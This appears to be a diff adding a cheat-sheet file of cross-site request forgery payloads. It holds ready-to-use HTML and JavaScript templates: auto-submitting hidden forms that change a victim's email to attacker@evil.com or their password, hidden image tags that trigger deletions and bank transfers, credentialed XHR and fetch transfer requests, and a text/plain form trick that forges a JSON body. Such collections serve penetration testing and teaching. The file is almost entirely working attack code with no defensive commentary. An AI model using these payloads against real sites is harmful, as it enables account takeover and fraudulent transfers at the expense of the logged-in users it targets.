@@ -1,0 +1,41 @@
+<!-- CSRF Basic Forms -->
+<form action="https://vulnerable-website.com/email/change" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com" />
+  <input type="submit" value="Update email" />
+</form>
+<script>document.forms[0].submit();</script>
+
+<!-- Auto-submit with delay -->
+<form id="csrf" action="https://target.com/change-password" method="POST">
+  <input type="hidden" name="password" value="hacked123" />
+</form>
+<script>setTimeout(function(){document.getElementById('csrf').submit();}, 1000);</script>
+
+<!-- GET based CSRF -->
+<img src="https://vulnerable-website.com/delete?id=123" width="0" height="0" />
+<img src="https://bank.com/transfer?amount=1000&to=attacker" style="display:none" />
+
+<!-- XMLHttpRequest CSRF -->
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://vulnerable-website.com/transfer", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("amount=1000&to=attacker");
+</script>
+
+<!-- Fetch API CSRF -->
+<script>
+fetch('https://vulnerable-website.com/api/transfer', {
+  method: 'POST',
+  mode: 'no-cors',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'amount=1000&to=attacker'
+});
+</script>
+
+<!-- JSON CSRF with form -->
+<form id="csrf-form" method="post" action="https://vulnerable-website.com/api/transfer" enctype="text/plain">
+  <input name='{"amount":1000,"to":"attacker","ignore_me":"' value='"}' type='hidden'>
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
